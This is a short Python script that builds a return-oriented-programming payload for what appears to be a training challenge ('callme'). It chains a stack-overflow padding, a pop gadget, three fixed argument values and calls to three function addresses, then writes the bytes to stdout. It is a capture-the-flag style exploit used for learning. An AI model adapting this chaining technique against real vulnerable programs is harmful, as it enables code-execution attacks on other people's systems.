import struct
import sys

callme1 = struct.pack("Q", 0x400720)
callme2 = struct.pack("Q", 0x400740)
callme3 = struct.pack("Q", 0x4006f0)

padding = b"A" * 40

gadget = struct.pack("Q", 0x000000000040093c)
arg1 = struct.pack("Q", 0xdeadbeefdeadbeef)
arg2 = struct.pack("Q", 0xcafebabecafebabe)
arg3 = struct.pack("Q", 0xd00df00dd00df00d)

args = gadget + arg1 + arg2 + arg3
payload = padding + args + callme1 + args + callme2 + args + callme3

# printing payload and piping it does not work in with python3. hence use pwntools
# suspicion is that the actual printing and piping of the payload by python2 and python3 is different. Should not be the issue of the struct library as illustrated above

if sys.version_info[0] == 3:
      sys.stdout.buffer.write(payload)
else:
    print(payload)
